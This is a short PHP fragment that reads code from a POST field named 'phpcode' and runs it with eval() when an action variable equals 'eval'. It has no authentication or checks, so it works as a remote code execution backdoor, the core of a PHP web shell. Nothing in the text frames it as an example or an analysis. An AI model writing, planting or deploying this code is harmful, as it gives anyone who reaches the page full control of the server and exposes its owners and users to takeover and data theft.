<?php
$phpcode = $_POST['phpcode'];
if ($action == 'eval') {
	$phpcode = trim($phpcode);
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?".">$phpcode<?");
	}
}
?>